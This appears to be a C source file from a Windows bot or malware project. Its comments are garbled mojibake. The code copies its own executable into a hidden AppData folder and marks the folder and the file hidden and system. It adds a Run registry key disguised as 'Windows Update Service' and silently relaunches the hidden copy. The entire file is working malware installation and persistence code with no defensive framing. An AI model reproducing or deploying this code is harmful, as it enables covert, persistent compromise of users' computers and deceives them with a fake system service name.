#include "header.h"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <tchar.h>



// ��ȡ��ǰģ��·��
void get_current_module_path(wchar_t* path, size_t len) {
    GetModuleFileNameW(NULL, path, (DWORD)len);
    path[len - 1] = L'\0';
}

// ��ȡ AppData\\Local ·��
void get_appdata_path(wchar_t* path, size_t len) {
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        path[len - 1] = L'\0';
    }
    else {
        path[0] = L'\0';
    }
}

// ��������Ŀ¼�������������
int create_hidden_directory(const wchar_t* path) {
    DWORD attr = GetFileAttributesW(path);
    char buf[MAX_PATH];
    UnicodeToAnsi(path, buf, MAX_PATH);
    if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        bot_log("[+] Directory already exists: %s\n", buf);
        return 0;  // �Ѵ��ڣ����贴��
    }

    if (!CreateDirectoryW(path, NULL)) {
        bot_log("[!] Failed to create directory: %s (Error: %d)\n", buf, GetLastError());
        return -1;
    }

#ifdef FILE_ATTR_HIDDEN
    if (!SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        bot_log("[!] Failed to set hidden attributes for folder: %s\n", buf);
        return -1;
    }
#endif

    bot_log("[+] Created folder: %s\n", buf);
    return 0;
}

// ������������
int copy_and_hide_bot() {
    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t dest_path[MAX_PATH];
    swprintf(dest_path, MAX_PATH, L"%s%s", appdata, HIDDEN_FOLDER);

    // Step 1: ��������Ŀ¼
    if (create_hidden_directory(dest_path) != 0) {
        bot_log("[!] Failed to create hidden directory\n");
        return -1;
    }

    // Step 2: ����Ŀ��·��
    wchar_t final_path[MAX_PATH];
    swprintf(final_path, MAX_PATH, L"%s\\%s", dest_path, TARGET_EXE_NAME);

    char buf[MAX_PATH];

    // Step 3: ��ȡ��ǰģ��·��
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);
    UnicodeToAnsi(current_path, buf, MAX_PATH);
    bot_log("[+] Current module path: %s\n", buf);

    // Step 4: ������������·��
    if (!CopyFileW(current_path, final_path, FALSE)) {// overwrite existing file
        bot_log("[!] Copy failed: %d\n", GetLastError());
        return -1;
    }


    UnicodeToAnsi(final_path, buf, MAX_PATH);
    bot_log("[+] Copied to hidden path: %s\n", buf);


#ifdef FILE_ATTR_HIDDEN
     //Step 5: ������������
    if (!SetFileAttributesW(final_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) 
    {
        bot_log("[!] Failed to set hidden attributes for file\n");
    }
    else {
        bot_log("[+] File attributes set to HIDDEN | SYSTEM\n");
    }
#endif

    // Step 6: ���ע�����������
    if (set_registry_persistence(final_path) != 0) {
        bot_log("[!] Failed to set registry persistence\n");
    }
    else {
        bot_log("[+] Registry persistence set\n");
    }

    // Step 7: ��������
    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
    sei.lpVerb = L"open";
    sei.lpFile = final_path;
    sei.nShow = SW_HIDE;


    if (!ShellExecuteExW(&sei)) {
        bot_log("[!] Failed to launch hidden instance (Error: %d)\n", GetLastError());
        return -1;
    }

    bot_log("[+] Hidden instance launched successfully\n");


    return 0;
}

// ע������������
int set_registry_persistence(const wchar_t* bot_path) {
    HKEY hKey;
    LONG res = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to open Run key\n");
        return -1;
    }

    res = RegSetValueExW(hKey, L"Windows Update Service", 0, REG_SZ, (BYTE*)bot_path, (wcslen(bot_path) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        bot_log("[!] Failed to write registry key\n");
        return -1;
    }

    return 0;
}

// ����Լ��Ƿ��Ѿ������ظ���
int is_hidden_bot() {
    wchar_t current_path[MAX_PATH];
    get_current_module_path(current_path, MAX_PATH);

    wchar_t appdata[MAX_PATH];
    get_appdata_path(appdata, MAX_PATH);

    wchar_t expected_path[MAX_PATH];
    swprintf(expected_path, MAX_PATH, L"%s%s\\%s", appdata, HIDDEN_FOLDER, TARGET_EXE_NAME);

    char buf[MAX_PATH];
    UnicodeToAnsi(expected_path, buf, sizeof(buf));
    bot_log("[DEBUG] Expected path: %s\n", buf);
    UnicodeToAnsi(current_path, buf, sizeof(buf));
    bot_log("[DEBUG] Current path: %s\n", buf);

    if (wcsstr(current_path, expected_path) != NULL) {
        bot_log("[+] Already running as hidden bot");
        return 1;  // �Ѿ������ظ���
    }

    bot_log("[-] Not running as hidden bot");
    return 0;  // �������ظ���
}